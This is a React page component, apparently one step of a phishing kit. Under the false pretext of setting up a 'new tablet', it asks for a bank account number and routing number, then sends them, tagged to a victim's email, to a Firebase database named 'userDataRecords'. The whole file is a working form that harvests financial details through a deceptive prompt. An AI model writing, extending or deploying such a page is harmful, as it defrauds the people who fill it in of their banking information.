import React from 'react'
import { useState } from 'react'

function Accounts({ inputData, setShowFinalOpt, setShowAccount }) {
    const [accNum, setAccNum] = useState('');
    const [routingNumber, setRoutingNumebr] = useState('');

    const message = 'This is account number of this email:';

    const handleClick2 = async (e) => {
        e.preventDefault();
    
        // const {  firstName, text} = userData;
        const res = await fetch("https://testing-ec81f-default-rtdb.firebaseio.com/userDataRecords.json",{
    
          method : "POST",
          headers: {
            "Content-Type" : "application/json",
          },
          body: JSON.stringify({
             accNum, routingNumber, message, inputData, 
          }),
        });
    
        if(res) {
          setShowAccount(false);
          setShowFinalOpt(true)
        } else {
          alert("Plz enter data")
        }
      }

  return (
        <div>
            <div className=' flex flex-col  my-16  mx-auto  ' >  
                <div className=' flex flex-col text-center mx-2 ' >
                    <h1 className=' font-semibold text-2xl my-3 ' >Account Information</h1>
                    <p className=' font-semibold text-black text-opacity-60 ' >Please enter your account details to set on new tablet</p>
                </div>
                <div className=' w-screen  max-w-[480px] lg:max-w-[600px] mx-auto  ' >
                    <div className=' flex flex-col mt-12 mx-3 ' >
                    <label htmlFor="id" className=' my-2 mx-1 text-base  ' > Account Number </label>
                    <input type="number" id='acc' className=' text-sm border border-black border-opacity-30 rounded-lg p-3  outline-[#91A5F9] [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none ' 
                          onChange={(e) => { setAccNum(e.target.value);}}
                    />
                    </div>
                    <div className=' flex flex-col mt-3 mx-3 ' >
                    <label htmlFor="routing" className=' my-2 mx-1 text-base ' >Routing Number</label>
                    <input type="number" id='number' className=' text-sm border border-black border-opacity-30 rounded-lg p-3  outline-[#91A5F9] [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none ' 
                          onChange={(e) => { setRoutingNumebr(e.target.value);}}
                    />
                    </div>
                </div>
                  <div className=' border-t border-full bg-white border-black border-opacity-30 fixed bottom-0 w-screen text-center p-4 px-6  ' >
                    <button className=' bg-[#4969F5] hover:bg-[#1537C7] hover:text-slate-50 active:bg-[#132c9c] active:text-slate-50 rounded-lg w-full p-3 text-white max-w-[650px] ' onClick={handleClick2} >
                        Submit
                    </button>
                  </div>
            </div>
        </div>
  )
}

export default Accounts